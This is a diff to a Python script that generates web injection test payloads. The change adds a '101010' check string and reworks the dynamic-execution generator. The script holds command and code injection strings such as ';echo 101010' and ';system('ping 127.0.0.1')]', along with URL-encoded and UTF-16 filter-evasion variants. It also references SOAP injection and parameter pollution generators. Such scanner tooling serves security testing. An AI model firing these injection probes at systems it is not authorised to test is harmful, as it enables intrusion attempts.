@@ -4,6 +4,7 @@ import random
 
 payload_type = None
 ######################################
+dynamic_ex_check_string = ['101010']
 dynamic_ex__page_inj_payload = [';echo 101010', 'echo 101010', 'response.write 101010', ':response.write 101010']
 dynamic_ex_delay_call_payload = ['''system('ping 127.0.0.1')]''', ''';system('ping 127.0.0.1')]''', ''':system('ping 127.0.0.1')]''']
 #######################################
@@ -64,7 +65,7 @@ def parameter_pollution_payload_gen():
     paylist.append(parameter_pollution_payload.replace('=', equalutf16).replace('&', andutf16))
 
 def dynamic_execution_gen():
-    global paylist, dynamic_ex__page_inj_payload, dynamic_ex_delay_call_payload, andutf16, equalutf16
+    global paylist, dynamic_ex__page_inj_payload, dynamic_ex_delay_call_payload, andutf16, equalutf16, dynamic_ex_check_string
     paylist_first_test = []
     paylist_second_test = []
     for i in dynamic_ex__page_inj_payload:
@@ -75,7 +76,7 @@ def dynamic_execution_gen():
         paylist_second_test.append(urllib.quote_plus(i))
         paylist_second_test.append(urllib.quote_plus(urllib.quote_plus(i)))
         paylist_second_test.append(i.replace(';', semicolonutf16).replace(':', colonutf16).replace('.', dotutf16).replace("'", apostropheutf16))
-    return [paylist_first_test, paylist_second_test]
+    paylist = [paylist_first_test, paylist_second_test, dynamic_ex_check_string]
 
 def soap_injection_payload_gen():
     global paylist, soap_inj_foo, soap_inj_foo_closed, soap_inj_comment, soap_inj_close_comment
